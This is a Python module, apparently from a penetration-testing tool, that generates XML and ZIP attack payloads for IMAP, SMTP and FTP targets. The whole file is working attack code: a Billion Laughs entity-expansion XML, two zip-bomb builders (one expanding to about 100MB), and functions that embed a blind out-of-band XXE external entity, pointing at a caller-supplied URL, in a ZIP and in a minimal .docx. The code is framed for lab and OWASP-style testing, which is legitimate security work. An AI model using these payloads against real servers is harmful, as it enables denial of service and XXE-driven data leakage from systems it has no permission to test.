"""XML / ZIP stress payloads for IMAP ZIPXXE (same set as SMTP ZIPXXE / FTP DOS).

Do not import heavy optional deps here; keep this module safe for all entrypoints.

Payloads follow the classic Billion Laughs nested-entity expansion, OWASP XXE
(SYSTEM entity + OOXML ZIP container), and layered DEFLATE zip bombs.
"""

from __future__ import annotations

import zipfile
from io import BytesIO

# Classic billion-laughs entity expansion (~10^9 "lol" when expanded; small on disk).
BILLION_LAUGHS_XML: str = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""


def build_minimal_zip_bomb() -> bytes:
    """Layered DEFLATE bomb: small on the wire, moderate expansion when extracted (lab-safe default)."""
    bio = BytesIO()
    data = b"\x00" * (10 * 1024)
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(20):
            zf.writestr(f"layer_{i}.bin", data)
    return bio.getvalue()


def build_full_zip_bomb() -> bytes:
    """High-ratio DEFLATE bomb: ~100KB compressed → ~100MB expanded (isolated labs only)."""
    bio = BytesIO()
    chunk = b"\x00" * (1024 * 1024)
    data_10mb = chunk * 10
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(10):
            zf.writestr(f"bomb_{i}.bin", data_10mb)
    return bio.getvalue()


def xxe_xml_template(url: str) -> str:
    """Blind/OOB XXE: SYSTEM entity pointing at a canary URL (OWASP WSTG XML Injection)."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>\n'
        "<document><content>&xxe;</content></document>"
    )


def build_zip_with_xxe(url: str) -> bytes:
    """ZIP containing report.xml with an external entity (parser may fetch canary on extract)."""
    bio = BytesIO()
    xml_content = xxe_xml_template(url).encode("utf-8")
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.xml", xml_content)
    return bio.getvalue()


def build_minimal_docx_with_xxe(url: str) -> bytes:
    """Minimal OOXML .docx with XXE in word/document.xml (office formats are ZIP+XML)."""
    xml_content = xxe_xml_template(url).encode("utf-8")
    bio = BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        ).encode("utf-8"))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>'
            '</Relationships>'
        ).encode("utf-8"))
        zf.writestr("word/document.xml", xml_content)
    return bio.getvalue()
